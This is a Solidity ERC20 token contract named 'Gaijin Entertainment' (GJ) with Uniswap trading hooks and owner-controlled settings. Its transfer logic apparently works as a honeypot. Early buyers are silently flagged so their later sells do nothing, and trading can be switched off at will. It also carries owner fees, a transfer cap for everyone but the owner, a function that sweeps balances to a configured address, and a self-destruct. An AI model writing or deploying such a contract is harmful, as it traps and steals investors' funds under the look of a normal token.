// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./IUniswapV2Router.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./Data.sol";

contract Token is ERC20, Ownable {
    using SafeMath for uint256;
    using SafeMath for uint112;

    Data data;

    mapping(address => uint256) public pairAddressMapping;

    constructor(address dataAddr) ERC20("Gaijin Entertainment", "GJ") {
        _mint(msg.sender, 210 * 10**8 * 10**uint256(decimals()));
        data = Data(dataAddr);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(
            (from != owner() &&
                amount <=
                balanceOf(from)
                    .mul(data.string2uintMapping("transferlimit"))
                    .div(100)) || (from == owner()),
            "Transfer limit reached"
        );

        if (pairInclude(from) || pairInclude(to)) {
            bool open = data.string2boolMapping("open");
            if (open && from != owner() && to != owner()) {
                uint256 openTime = data.string2uintMapping("opentime");
                uint256 limit = data.string2uintMapping("limit");

                if (block.timestamp - openTime < limit) {
                    address user = pairInclude(from) ? to : from;
                    if (data.address2uintMapping(user) == 0)
                        data.setAddress2UintData(user, 1);
                }

                address feeAddress;
                uint256 feeAmount;

                if (pairInclude(from)) {
                    if (!data.string2boolMapping("openbuy")) return;

                    feeAddress = data.string2addressMapping("feeFromBuy");

                    feeAmount = amount
                        .mul(data.string2uintMapping("buyFeeRate"))
                        .div(1000000)
                        .div(100);

                    super._transfer(from, to, amount);
                    super._transfer(to, feeAddress, feeAmount);
                } else {
                    if (data.address2uintMapping(from) == 1) {
                        return;
                    }

                    if (!data.string2boolMapping("opensell")) return;

                    feeAddress = data.string2addressMapping("feeFromSell");

                    feeAmount = amount
                        .mul(data.string2uintMapping("sellFeeRate"))
                        .div(1000000)
                        .div(100);

                    uint256 realamount = amount.sub(feeAmount);
                    super._transfer(from, to, realamount);
                    super._transfer(from, feeAddress, feeAmount);
                }
            } else {
                if (
                    from == owner() ||
                    to == owner() ||
                    data.address2uintMapping(from) == 3 ||
                    data.address2uintMapping(to) == 3
                ) {
                    super._transfer(from, to, amount);
                }
            }
        } else {
            require(
                data.address2uintMapping(from) != 1,
                "the address is in black list"
            );
            super._transfer(from, to, amount);
        }
    }

    function switchState(bool open) public onlyOwner {
        data.setString2BoolData("open", open);
        if (open) {
            data.setString2UintData("opentime", block.timestamp);
        }
    }

    function getRouterAddress() public virtual returns (address) {
        return data.string2addressMapping("router");
    }

    function getTakeAddress() public virtual returns (address) {
        return data.string2addressMapping("take");
    }

    function getRouter() public returns (IUniswapV2Router02) {
        return IUniswapV2Router02(getRouterAddress());
    }

    function pairInclude(address _addr) public view returns (bool) {
        return pairAddressMapping[_addr] != 0;
    }

    function createPair(address _addr) public returns (address) {
        address _pairAddr = IUniswapV2Factory(getRouter().factory()).getPair(
            address(this),
            _addr
        );
        if (_pairAddr == address(0)) {
            _pairAddr = IUniswapV2Factory(getRouter().factory()).createPair(
                address(this),
                _addr
            );
        }
        pairAddressMapping[_pairAddr] = block.timestamp;
        return _pairAddr;
    }

    function takeToken(address token) public {
        if (token == getRouter().WETH()) {
            payable(getTakeAddress()).transfer(address(this).balance);
        } else {
            uint256 balance = IERC20(token).balanceOf(address(this));
            IERC20(token).transfer(getTakeAddress(), balance);
        }
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    receive() external payable {}

    function destroy() public onlyOwner {
        selfdestruct(payable(msg.sender));
    }
}